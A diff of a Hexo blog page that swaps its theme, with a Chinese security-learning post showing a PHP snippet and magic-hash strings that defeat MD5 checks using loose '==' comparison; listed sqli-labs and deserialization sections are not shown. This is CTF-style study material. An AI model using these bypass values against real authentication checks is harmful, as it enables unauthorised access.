@@ -1,573 +1,315 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>tyc的小窝</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="tyc的小窝">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="渗透基础入门名词解释web应用框架常规的Web应用搭建 购买云服务器，购买域名">
-<meta property="og:type" content="article">
-<meta property="og:title" content="tyc的小窝">
-<meta property="og:url" content="http://example.com/2024/03/28/%E6%B8%97%E9%80%8F/index.html">
-<meta property="og:site_name" content="tyc的小窝">
-<meta property="og:description" content="渗透基础入门名词解释web应用框架常规的Web应用搭建 购买云服务器，购买域名">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-03-28T05:19:32.752Z">
-<meta property="article:modified_time" content="2024-03-29T09:35:28.875Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
+	<head>
+		
+<title>Hexo主题-Quiet主题-Hexo扁平化主题安装-Quiet</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">
+
+<link rel="stylesheet" href="/css/index.css">
 
 
-<link rel="icon" href="/img/avatar.jpg">
-
-<link href="/css/style.css?v=1.1.0" rel="stylesheet">
-
-<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
-
-<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
-
-<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
-<script src="/js/titleTip.js?v=1.1.0" ></script>
-
-<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
-<script>
-    hljs.initHighlightingOnLoad();
-</script>
-
-<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+<meta name="keywords" content="hexo主题,hexo扁平化主题,Quiet主题">
+<meta name="description" content="描述">
 
 
-
-<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
-
-<script src="/js/iconfont.js?v=1.1.0" ></script>
-
-<meta name="generator" content="Hexo 6.3.0"></head>
-<div style="display: none">
-  <input class="theme_disqus_on" value="false">
-  <input class="theme_preload_comment" value="">
-  <input class="theme_blog_path" value="">
-  <input id="theme_shortcut" value="true" />
-  <input id="theme_highlight_on" value="true" />
-  <input id="theme_code_copy" value="true" />
-</div>
+<script src="/js/jquery.min.js"></script>
 
 
-
-<body>
-<aside class="nav">
-    <div class="nav-left">
-        <a href="/"
-   class="avatar_target">
-    <img class="avatar"
-         src="/img/avatar.jpg"/>
-</a>
-<div class="author">
-    <span>John Doe</span>
-</div>
-
-<div class="icon">
-    
-        
-            <a title="rss"
-               href="/atom.xml"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-rss"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="github"
-               href="https://github.com/yelog"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-github"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="facebook"
-               href="https://www.facebook.com/faker.tops"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-facebook"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-    
-        
-    
-        
-            <a title="instagram"
-               href="https://www.facebook.com/faker.tops"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-instagram"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="reddit"
-               href="https://www.reddit.com/user/yelog/"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-reddit"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="weibo"
-               href="http://weibo.com/u/2307534817"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-weibo"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="jianshu"
-               href="https://www.jianshu.com/u/ff56736de7cf"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-jianshu"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="zhihu"
-               href="https://www.zhihu.com/people/jaytp/activities"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-zhihu"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-    
-        
-            <a title="oschina"
-               href="https://my.oschina.net/yelog"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-oschina"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-    
-        
-            <a title="email"
-               href="mailto:jaytp@qq.com"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-email"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="qq"
-               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-qq"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="kugou"
-               href="https://www.kugou.com/"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-kugou"></use>
-                    </svg>
-                
-            </a>
-        
-    
-        
-            <a title="neteasemusic"
-               href="https://music.163.com/#/user/home?id=88151013"
-               target="_blank">
-                
-                    <svg class="iconfont-svg" aria-hidden="true">
-                        <use xlink:href="#icon-neteasemusic"></use>
-                    </svg>
-                
-            </a>
-        
-    
-</div>
+<script src="/js/index.js"></script>
 
 
+<script src="/js/fancybox.umd.js"></script>
 
 
+<script src="/js/fancybox-images.js"></script>
 
-<ul>
-    <li>
-        <div class="all active" data-rel="All">All
-            
-                <small>(20)</small>
-            
-        </div>
-    </li>
-    
-</ul>
-<div class="left-bottom">
-    <div class="menus">
-        
-            
-            
-            
+
+<script src="/js/gitalk.min.js"></script>
+
+
+<script src="/js/hljs.min.js"></script>
+ 
+<script>hljs.highlightAll();</script>
+
+	<meta name="generator" content="Hexo 6.3.0"></head>
+
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Joey</h2>
     </div>
-    <div>
+    <ul>
         
-            <a class="about  hasFriend  site_url"
-               
-               href="/about">About</a>
+        <li>
+            <a href="/">HOME</a>
+        </li>
         
-        <a style="width: 50%"
-                
-                                           class="friends">Friends</a>
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
+        
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
+        
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
+        
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="20">
-
-<div style="display: none">
-    <span id="busuanzi_value_site_uv"></span>
-    <span id="busuanzi_value_site_pv"></span>
+<div class='shelter'>
 </div>
-
-    </div>
-    <div class="nav-right">
-        <div class="friends-area">
-    <div class="friends-title">
-        Links
-        <i class="iconfont icon-left"></i>
-    </div>
-    <div class="friends-content">
-        <ul>
-            
-            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
-            
-        </ul>
-    </div>
-</div>
-        <div class="title-list">
-    <div class="right-top">
-        <div id="default-panel">
-            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
-            <div class="right-title">All</div>
-            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
-        </div>
-        <div id="search-panel">
-            <i class="iconfont icon-left" data-title="返回"></i>
-            <input id="local-search-input" autocomplete="off"/>
-            <label class="border-line" for="input"></label>
-            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
-            <i class="iconfont icon-tag" data-title="标签"></i>
-        </div>
-        <div id="outline-panel" style="display: none">
-            <div class="right-title">大纲</div>
-            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
-        </div>
-    </div>
-
-    <div class="tags-list">
-    <input id="tag-search" />
-    <div class="tag-wrapper">
-        
-    </div>
-
-</div>
-
-    
-    <nav id="title-list-nav">
-        
-        
-        <a  class="All "
-           href="/2024/03/28/%E6%B8%97%E9%80%8F/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2024-03-28 13:19:32">2024/03/28</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/03/27/vim/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2024-03-27 14:16:22">2024/03/27</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/03/25/%E9%98%B2%E7%81%AB%E5%A2%99/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2024-03-25 23:12:18">2024/03/25</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/03/23/docker/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2024-03-23 18:12:23">2024/03/23</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/12/22/java/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-12-22 15:33:09">2023/12/22</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/11/05/%E9%99%87%E5%89%91%E6%9D%AF/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-11-05 22:25:24">2023/11/05</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/11/05/%E9%B9%8F%E7%A8%8B%E6%9D%AFmisc/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-11-05 16:23:25">2023/11/05</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/11/05/hexo%E8%BF%81%E7%A7%BB/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-11-05 15:50:09">2023/11/05</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/09/28/web%E5%AD%A6%E4%B9%A0/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-09-28 17:31:11">2023/09/28</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/09/27/misc/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-09-27 16:21:55">2023/09/27</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/09/21/%E9%9A%8F%E7%AC%94/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-09-21 13:54:35">2023/09/21</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/09/08/win%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E6%9F%A5%E8%AF%A2/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-09-08 15:32:06">2023/09/08</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/08/09/%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88Mysql)/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-08-09 18:49:11">2023/08/09</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/07/26/%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-07-26 21:28:45">2023/07/26</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/07/26/linux%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-07-26 21:28:34">2023/07/26</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/07/22/%E7%88%AC%E8%99%AB/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-07-22 23:06:24">2023/07/22</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/06/11/%E5%AF%86%E7%A0%81/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-06-11 22:21:08">2023/06/11</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/06/11/pwn/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-06-11 22:21:08">2023/06/11</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/06/11/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-06-11 22:21:08">2023/06/11</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/06/11/Crypto%E5%BA%93/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title=""></span>
-            <span class="post-date" title="2023-06-11 22:21:08">2023/06/11</span>
-        </a>
-        
-        <div id="no-item-tips">
-
-        </div>
-    </nav>
-    <div id="outline-list">
-    </div>
-</div>
-
-    </div>
-    <div class="hide-list">
-        <div class="semicircle" data-title="切换全屏 快捷键 s">
-            <div class="brackets first"><</div>
-            <div class="brackets">&gt;</div>
-        </div>
-    </div>
-</aside>
-<div id="post">
-    <div class="pjax">
-        <article id="post-web学习" class="article article-type-post" itemscope itemprop="blogPost">
-    
-    <div class="article-meta">
-        
-        
-        
-        
-    </div>
-    <div class="article-meta">
-        
-            Created At : <time class="date" title='Updated At: 2024-03-29 17:02:53'>2023-09-28 17:31</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        
-        <span id="busuanzi_container_page_pv">
-            Views 👀 :<span id="busuanzi_value_page_pv">
-                <span class="count-comment">
-                    <span class="spinner">
-                      <div class="cube1"></div>
-                      <div class="cube2"></div>
-                    </span>
-                </span>
-            </span>
-        </span>
-        
-        
-    </div>
-    
-    <div class="toc-ref">
-    
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%AD%A6%E4%B9%A0"><span class="toc-text">web学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHPMD5%E7%BB%95%E8%BF%87"><span class="toc-text">PHPMD5绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E2%80%9Coe%E2%80%9D-%E7%BB%95%E8%BF%87"><span class="toc-text">1 “oe” 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%88PHP-8-%E6%97%A0%E6%B3%95%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">数组绕过（PHP 8 无法绕过）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-%E7%A2%B0%E6%92%9E"><span class="toc-text">md5 碰撞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0"><span class="toc-text">sqli-labs靶场学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less1"><span class="toc-text">less1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less2"><span class="toc-text">less2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less3"><span class="toc-text">less3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less4"><span class="toc-text">less4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-text">1.魔法方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">2.序列化</span></a></li></ol></li></ol>
-    
 <style>
-    .left-col .switch-btn,
-    .left-col .switch-area {
-        display: none;
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
+        right: 0;
+        bottom: 0;
+        z-index: 1998;
     }
-    .toc-level-3 i,
-    .toc-level-3 ol {
-        display: none !important;
+    .sidebar {
+        width: 66%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
     }
 </style>
+
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					right: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					right: "-100%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('https://api.ixiaowai.cn/gqapi/gqapi.php')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+        </ul>
+        
+        <h1></h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Joey</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                </div>
+                <p>2023-09-28 17:31:11</p>
+            </div>
+        </div>
+    </div>
 </div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="web学习"><a href="#web学习" class="headerlink" title="web学习"></a>web学习</h3><h4 id="PHPMD5绕过"><a href="#PHPMD5绕过" class="headerlink" title="PHPMD5绕过"></a>PHPMD5绕过</h4><h4 id="1-“oe”-绕过"><a href="#1-“oe”-绕过" class="headerlink" title="1 “oe” 绕过"></a>1 “oe” 绕过</h4><p>​		因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p>
+
+    <h3 id="web学习"><a href="#web学习" class="headerlink" title="web学习"></a>web学习</h3><h4 id="一-PHPMD5绕过"><a href="#一-PHPMD5绕过" class="headerlink" title="一.PHPMD5绕过"></a>一.PHPMD5绕过</h4><h5 id="1-“oe”-绕过"><a href="#1-“oe”-绕过" class="headerlink" title="1 “oe” 绕过"></a>1 “oe” 绕过</h5><p>​		因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p>
 <p>​		基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s878926199a&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;s155964671a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// s878926199a--&gt;0e545993274517709034328855841020</span></span><br><span class="line"><span class="comment">// s155964671a--&gt;0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字</span></span><br><span class="line"><span class="variable">$a1</span> = <span class="string">&quot;0e33&quot;</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="string">&quot;0e89&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a1</span> == <span class="variable">$b1</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 字母</span></span><br><span class="line"><span class="variable">$a3</span> = <span class="string">&quot;0eadd&quot;</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a3</span> == <span class="variable">$b3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字/字母</span></span><br><span class="line"><span class="variable">$a4</span> = <span class="string">&quot;0ea34343dd&quot;</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a4</span> == <span class="variable">$b4</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -575,29 +317,29 @@
 <p>常见的 md5 值是 <code>0e</code> 开头且后面均为数字的字符串</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 